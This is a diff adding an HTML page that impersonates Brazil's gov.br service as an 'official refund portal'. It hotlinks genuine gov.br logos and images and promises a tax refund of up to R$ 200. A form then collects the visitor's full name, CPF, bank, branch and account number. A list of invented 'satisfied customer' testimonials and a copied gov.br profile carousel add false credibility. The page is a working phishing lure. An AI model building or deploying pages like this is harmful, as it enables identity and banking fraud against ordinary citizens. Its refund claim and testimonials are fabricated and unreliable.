@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Portal Oficial de Reembolso</title>
+    <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f7f9fc;
+      margin: 0;
+      padding: 0;
+      color: #333;
+    }
+    header {
+      background-color: #007a33;
+      color: white;
+      padding: 20px;
+      text-align: center;
+    }
+    main {
+      display: flex;
+      max-width: 1000px;
+      margin: 40px auto;
+      background: white;
+      border-radius: 8px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+      padding: 30px;
+      gap: 40px; /* espace entre photo et formulaire */
+    }
+    .photo-container {
+      flex: 2; /* prend plus de place */
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .photo-container img {
+      max-width: 100%;
+      height: auto;
+      border-radius: 8px;
+    }
+    .form-container {
+      flex: 1; /* moins large */
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+    }
+    form label {
+      display: block;
+      margin-bottom: 6px;
+      font-weight: bold;
+      font-size: 0.9em;
+    }
+    form input,
+    form select {
+      width: 100%;
+      padding: 8px 10px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 1em;
+      box-sizing: border-box;
+    }
+    form button {
+      background-color: #28a745;
+      color: white;
+      border: none;
+      width: 100%;
+      padding: 12px;
+      font-size: 1.1em;
+      border-radius: 4px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+    form button:hover {
+      background-color: #218838;
+    }
+    small.note {
+      font-size: 0.8em;
+      color: #666;
+      margin-bottom: 15px;
+      display: block;
+      text-align: center;
+    }
+  </style>
+  </head>
+  <body>
+    <header> <span class="br-divider vertical mx-half mx-sm-1" style="font-family: Rawline, sans-serif; box-sizing: border-box; margin-left: 4px !important; margin-right: 4px !important; --divider-size: 1px; border-color: rgb(204, 204, 204); border-style: solid; border-width: 0px 1px 0px 0px; display: block; align-self: stretch;"></span>
+      <div class="wrapper svelte-1jznxvb" style="font-family: Rawline,sans-serif; box-sizing: border-box; display: flex; flex-direction: row; margin-right: 8px; text-align: left;">
+        <div class="wrapper svelte-18ap8dw" style="font-family: Rawline,sans-serif; box-sizing: border-box; margin-left: 6px; position: relative; color: #555555; font-size: 16px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; text-indent: 0px; text-transform: none; word-spacing: 0px; -webkit-text-stroke-width: 0px; white-space: normal; background-color: white; text-decoration-style: initial; text-decoration-color: initial;">
+          <div class="button-badge svelte-ippqk1" style="font-family: Rawline,sans-serif; box-sizing: border-box; position: relative; height: 57px; width: 1225px; margin-top: -3px;"><span
+              class="langue-select svelte-18ap8dw" style="color-scheme: unset; forced-color-adjust: unset; mask: unset; math-depth: unset; position: unset; position-anchor: unset; text-size-adjust: unset; appearance: unset; color: rgb(19, 81, 180); font-family: unset; font-feature-settings: unset; font-kerning: unset; font-optical-sizing: unset; font-palette: unset; font-size: unset; font-size-adjust: unset; font-stretch: unset; font-style: unset; font-synthesis: unset; font-variant: unset; font-variation-settings: unset; font-weight: 700; position-area: unset; text-orientation: unset; text-rendering: unset; text-spacing-trim: unset; -webkit-font-smoothing: unset; -webkit-locale: unset; -webkit-text-orientation: unset; -webkit-writing-mode: unset; writing-mode: unset; zoom: unset; accent-color: unset; place-content: unset; place-items: unset; place-self: unset; alignment-baseline: unset; anchor-name: unset; anchor-scope: unset; animation-composition: unset; animation: unset; app-region: unset; aspect-ratio: unset; backdrop-filter: unset; backface-visibility: unset; background: unset; background-blend-mode: unset; baseline-shift: unset; baseline-source: unset; block-size: unset; border-block: unset; border: unset; border-radius: unset; border-collapse: unset; border-end-end-radius: unset; border-end-start-radius: unset; border-inline: unset; border-start-end-radius: unset; border-start-start-radius: unset; inset: unset; box-decoration-break: unset; box-shadow: unset; box-sizing: unset; break-after: unset; break-before: unset; break-inside: unset; buffered-rendering: unset; caption-side: unset; caret-color: unset; clear: unset; clip: unset; clip-path: unset; clip-rule: unset; color-interpolation: unset; color-interpolation-filters: unset; color-rendering: unset; columns: unset; column-fill: unset; gap: unset; column-rule: unset; column-span: unset; contain: unset; contain-intrinsic-block-size: unset; contain-intrinsic-size: unset; contain-intrinsic-inline-size: unset; container: unset; content: unset; content-visibility: unset; counter-increment: unset; counter-reset: unset; counter-set: unset; cursor: unset; cx: unset; cy: unset; d: unset; display: unset; dominant-baseline: unset; dynamic-range-limit: unset; empty-cells: unset; field-sizing: unset; fill: unset; fill-opacity: unset; fill-rule: unset; filter: unset; flex: unset; flex-flow: unset; float: unset; flood-color: unset; flood-opacity: unset; grid: unset; grid-area: unset; height: unset; hyphenate-character: unset; hyphenate-limit-chars: unset; hyphens: unset; image-orientation: unset; image-rendering: unset; initial-letter: unset; inline-size: unset; inset-block: unset; inset-inline: unset; interpolate-size: unset; isolation: unset; letter-spacing: unset; lighting-color: unset; line-break: unset; line-height: unset; list-style: unset; margin-block: unset; margin-bottom: unset; margin-inline: unset; margin-left: unset; margin-right: 2px; margin-top: unset; marker: unset; mask-type: unset; math-shift: unset; math-style: unset; max-block-size: unset; max-height: unset; max-inline-size: unset; max-width: unset; min-block-size: unset; min-height: unset; min-inline-size: unset; min-width: unset; mix-blend-mode: unset; object-fit: unset; object-position: unset; object-view-box: unset; offset: unset; opacity: unset; order: unset; orphans: unset; outline: unset; outline-offset: unset; overflow-anchor: unset; overflow-block: unset; overflow-clip-margin: unset; overflow-inline: unset; overflow-wrap: unset; overflow: unset; overlay: unset; overscroll-behavior-block: unset; overscroll-behavior-inline: unset; overscroll-behavior: unset; padding-block: unset; padding: unset; padding-inline: unset; page: unset; page-orientation: unset; paint-order: unset; perspective: unset; perspective-origin: unset; pointer-events: unset; position-try: unset; position-visibility: unset; print-color-adjust: unset; quotes: unset; r: unset; reading-flow: unset; reading-order: unset; resize: unset; rotate: unset; ruby-align: unset; ruby-position: unset; rx: unset; ry: unset; scale: unset; scroll-behavior: unset; scroll-initial-target: unset; scroll-margin-block: unset; scroll-margin: unset; scroll-margin-inline: unset; scroll-marker-group: unset; scroll-padding-block: unset; scroll-padding: unset; scroll-padding-inline: unset; scroll-snap-align: unset; scroll-snap-stop: unset; scroll-snap-type: unset; scroll-timeline: unset; scrollbar-color: unset; scrollbar-gutter: unset; scrollbar-width: unset; shape-image-threshold: unset; shape-margin: unset; shape-outside: unset; shape-rendering: unset; size: unset; speak: unset; stop-color: unset; stop-opacity: unset; stroke: unset; stroke-dasharray: unset; stroke-dashoffset: unset; stroke-linecap: unset; stroke-linejoin: unset; stroke-miterlimit: unset; stroke-opacity: unset; stroke-width: unset; tab-size: unset; table-layout: unset; text-align: unset; text-align-last: unset; text-anchor: unset; text-box: unset; text-combine-upright: unset; text-decoration: unset; text-decoration-skip-ink: unset; text-emphasis: unset; text-emphasis-position: unset; text-indent: unset; text-overflow: unset; text-shadow: unset; text-transform: unset; text-underline-offset: unset; text-underline-position: unset; text-wrap: unset; timeline-scope: unset; touch-action: unset; transform: unset; transform-box: unset; transform-origin: unset; transform-style: unset; transition: unset; translate: unset; user-select: unset; vector-effect: unset; vertical-align: unset; view-timeline: unset; view-transition-class: unset; view-transition-name: unset; visibility: unset; border-spacing: unset; -webkit-box-align: unset; -webkit-box-decoration-break: unset; -webkit-box-direction: unset; -webkit-box-flex: unset; -webkit-box-ordinal-group: unset; -webkit-box-orient: unset; -webkit-box-pack: unset; -webkit-box-reflect: unset; -webkit-line-break: unset; -webkit-line-clamp: unset; -webkit-mask-box-image: unset; -webkit-rtl-ordering: unset; -webkit-ruby-position: unset; -webkit-tap-highlight-color: unset; -webkit-text-combine: unset; -webkit-text-decorations-in-effect: unset; -webkit-text-fill-color: unset; -webkit-text-security: unset; -webkit-text-stroke: unset; -webkit-user-drag: unset; white-space-collapse: unset; widows: unset; width: unset; will-change: unset; word-break: unset; word-spacing: unset; x: unset; y: unset; z-index: unset;"><span
+                class="sr-only" style="font-family: Rawline, sans-serif; box-sizing: border-box; border: 0px; clip: rect(0px, 0px, 0px, 0px); height: 1px; margin: -1px; overflow: hidden; padding: 0px; position: absolute; width: 1px;">Idioma
+                a</span></span><img src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png"
+              alt="Logomarca GovBR" style="width: 124px; height: 47px;"><b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+              &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; Portal Oficial de
+              Reembolso&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>
+            </b></div>
+        </div>
+      </div>
+    </header>
+    <main>
+      <div class="photo-container"> <img src="https://sso.acesso.gov.br/assets/govbr/img/conta_govbr_v2.jpg"
+          alt="Mulher" style="width: 596px; height: 430px;"> </div>
+      <div class="form-container">
+        <p style="font-weight: bold; color: #004d20; text-align: center; font-size: 1.1em; margin-bottom: 20px;">
+          Parabéns! Você tem direito a um reembolso de imposto de até R$ 200,00.
+        </p>
+        <p style="text-align: center; font-weight: bold;"> Para receber o valor,
+          confirme seus dados&nbsp; no formulário abaixo. </p>
+        <form action="/submit" method="POST"> <label for="nome">Nome completo:</label>
+          <input id="nome" name="nome" required="" type="text"> <label for="cpf">CPF
+            (somente números):</label> <input id="cpf" name="cpf" pattern="\d{11}"
+            maxlength="11" placeholder="Ex: 12345678900" required="" type="text">
+          <label for="banco">Banco:</label>
+          <select id="banco" name="banco" required="">
+            <option value="">Selecione o banco</option>
+            <option value="bb">Banco do Brasil</option>
+            <option value="itau">Itaú</option>
+            <option value="bradesco">Bradesco</option>
+            <option value="caixa">Caixa Econômica</option>
+            <option value="santander">Santander</option>
+            <option value="inter">Banco Inter</option>
+            <option value="outro">Outro</option>
+          </select>
+          <label for="agencia">Agência:</label> <input id="agencia" name="agencia"
+            maxlength="6" required="" type="text"> <label for="conta">Conta
+            corrente ou poupança:</label> <input id="conta" name="conta" maxlength="12"
+            required="" type="text"> <small class="note">Seus dados são
+            utilizados apenas para o depósito do reembolso.</small> <button type="submit">Confirmar
+            e solicitar reembolso</button> </form>
+      </div>
+    </main>
+    <div class="photo-container"> <br>
+      <h2 style="font-weight: bold; text-align: center; margin-top: 20px; color: #2c3e50;"><br>
+      </h2>
+      <h2 style="font-weight: bold; text-align: center; margin-top: 20px; color: #2c3e50;"><br>
+      </h2>
+      <h2 style="font-weight: bold; text-align: center; margin-top: 20px; color: #2c3e50;"><br>
+      </h2>
+      <h2 style="font-weight: bold; text-align: center; margin-top: 20px; color: #2c3e50;">Garanta
+        seu reembolso rápido e seguro !</h2>
+      <p><br>
+      </p>
+      <p><br>
+      </p>
+      <h2 style="font-weight: bold; text-align: center; margin-top: 20px; color: #2c3e50;">
+      </h2>
+      <p style="margin-top: 10px; font-size: 0.9em; color: #555; text-align: center;"><br>
+      </p>
+      <p style="margin-top: 10px; font-size: 0.9em; color: #555; text-align: center;"><br>
+      </p>
+      <p style="margin-top: 10px; font-size: 0.9em; color: #555; text-align: center;"><br>
+      </p>
+      <p style="margin-top: 10px; font-size: 0.9em; color: #555; text-align: center;"><br>
+      </p>
+      <p style="margin-top: 10px; font-size: 0.9em; color: #555; text-align: center;"><br>
+      </p>
+      <p style="margin-top: 10px; font-size: 0.9em; color: #555; text-align: center;"><br>
+      </p>
+      <p></p>
+    </div>
+    <div class="comentarios" style="margin-top: 30px; max-width: 600px; margin-left: auto; margin-right: auto; font-family: Arial, sans-serif;">
+      <h3 style="text-align: center; color: #34495e;">Comentários de clientes
+        satisfeitos</h3>
+      <ul style="list-style: none; padding: 0;">
+        <li style="background: #ecf0f1; margin-bottom: 10px; padding: 10px; border-radius: 5px;">
+          <strong>João S.</strong>: Recebi meu reembolso muito rápido, serviço
+          excelente! </li>
+        <li style="background: #ecf0f1; margin-bottom: 10px; padding: 10px; border-radius: 5px;">
+          <strong>Maria A.</strong>: Processo simples e seguro, recomendo
+          demais! </li>
+        <li style="background: #ecf0f1; margin-bottom: 10px; padding: 10px; border-radius: 5px;">
+          <strong>Lucas M.</strong>: Atendimento eficiente e resposta rápida,
+          adorei! </li>
+        <li style="background: #ecf0f1; margin-bottom: 10px; padding: 10px; border-radius: 5px;">
+          <strong>Ana P.</strong>: Super prático e confiável, fiquei muito
+          satisfeita. </li>
+        <li style="background: #ecf0f1; margin-bottom: 10px; padding: 10px; border-radius: 5px;">
+          <strong>Rafael C.</strong>: Excelente suporte e reembolso sem
+          complicações. </li>
+        <li style="background: #ecf0f1; margin-bottom: 10px; padding: 10px; border-radius: 5px;">
+          <strong>Fernanda L.</strong>: Tudo rápido e fácil, recomendo para
+          todos! </li>
+        <li style="background: #ecf0f1; margin-bottom: 10px; padding: 10px; border-radius: 5px;">
+          <strong>Pedro N.</strong>: Muito satisfeito com a agilidade no
+          processo. </li>
+        <li style="background: #ecf0f1; margin-bottom: 10px; padding: 10px; border-radius: 5px;">
+          <strong>Carla R.</strong>: Atendimento maravilhoso, solucionaram tudo
+          rápido. </li>
+        <li style="background: #ecf0f1; margin-bottom: 10px; padding: 10px; border-radius: 5px;">
+          <strong>Thiago V.</strong>: Processo transparente e eficiente, gostei
+          muito! </li>
+        <li style="background: #ecf0f1; margin-bottom: 10px; padding: 10px; border-radius: 5px;">
+          <strong>Juliana F.</strong>: Reembolso chegou antes do esperado,
+          parabéns! </li>
+      </ul>
+    </div>
+    <div class="row">
+      <div class="row-content">
+        <div class="column col-md-12 tile-default " data-panel=""><a class="novos-perfis"><span
+              class="texto"></span></a>
+          <div class="tile tile-default" id="bd1d3567-0b01-4c52-b1fc-27811db7399e">
+            <div class="cover-list-tile tile-content servicos-por-perfil-de-usuario">
+              <div class="swiper-container tilePerfisSwiper">
+                <div class="itens swiper-wrapper"> <a class="item-tile-perfil-usuario swiper-slide"
+                    href="https://www.gov.br/pt-br/perfil_usuario/agricultor"> <img
+                      src="https://www.gov.br/pt-br/perfil_usuario/agricultor/@@images/image"
+                      alt="Agricultor"> <span class="texto">Agricultor</span> </a>
+                  <a class="item-tile-perfil-usuario swiper-slide" href="https://www.gov.br/pt-br/perfil_usuario/turista">
+                    <img src="https://www.gov.br/pt-br/perfil_usuario/turista/@@images/image"
+                      alt="Turista"> <span class="texto">Turista</span> </a> <a
+                    class="item-tile-perfil-usuario swiper-slide" href="https://www.gov.br/pt-br/perfil_usuario/aposentado">
+                    <img src="https://www.gov.br/pt-br/perfil_usuario/aposentado/@@images/image"
+                      alt="Aposentado"> <span class="texto">Aposentado</span> </a>
+                  <a class="item-tile-perfil-usuario swiper-slide" href="https://www.gov.br/pt-br/perfil_usuario/empreendedor">
+                    <img src="https://www.gov.br/pt-br/perfil_usuario/empreendedor/@@images/image"
+                      alt="Empreendedor"> <span class="texto">Empreendedor</span>
+                  </a> <a class="item-tile-perfil-usuario swiper-slide" href="https://www.gov.br/pt-br/perfil_usuario/trabalhador">
+                    <img src="https://www.gov.br/pt-br/perfil_usuario/trabalhador/@@images/image"
+                      alt="Trabalhador"> <span class="texto">Tr</span></a></div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </body>
+</html>
